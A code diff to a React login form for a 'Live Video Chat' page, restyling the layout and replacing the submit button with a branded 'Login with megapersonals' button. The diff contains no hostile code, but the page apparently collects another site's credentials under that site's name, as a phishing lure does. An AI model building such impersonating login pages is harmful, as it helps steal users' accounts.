@@ -33,12 +33,12 @@ function LoginForm({ setShowModal }) {
 
   return (
     <div className="px-5 lg:px-10 pt-5 pb-10 md:w-[420px] bg-white w-[400px] shadow-lg rounded-lg">
-      <div className="px-8 md:px-12">
-        <h3 className="text-[32px] font-bold text-[#2b044d] text-center">
+      <div className="gap-5">
+        <h3 className="text-[32px] font-bold text-[#2b044d]">
           Live Video Chat
         </h3>
 
-        <p className="mt-[15px] text-lg leading-tight font-medium ">
+        <p className="text-lg leading-tight font-medium">
           Login with megapersonals and enjoy with{" "}
           <span className="text-[#2b044d] font-bold">
             Private Live Video Chat
@@ -71,11 +71,25 @@ function LoginForm({ setShowModal }) {
                 required
               />
 
-              <button
+              {/* <button
                 type="submit"
                 className="mt-5 w-full text-lg font-medium bg-[#2ba6cb] hover:bg-custom-cyan2 py-[10px] text-white transition duration-300 rounded"
               >
                 Log in
+              </button> */}
+              <button
+                className="bg-[#58C2FC] text-white text-lg  flex items-center gap-10 lg:gap-5 px-5 py-[6px] rounded-md w-full"
+                type="submit"
+              >
+                <div className="relative w-10 h-10 rounded-md overflow-hidden">
+                  <Image
+                    src="/images/logo-potrait.jpg"
+                    alt="potrait"
+                    fill
+                    className="object-cover"
+                  />
+                </div>
+                <p className="">Login with megapersonals</p>
               </button>
             </Form>
           )}
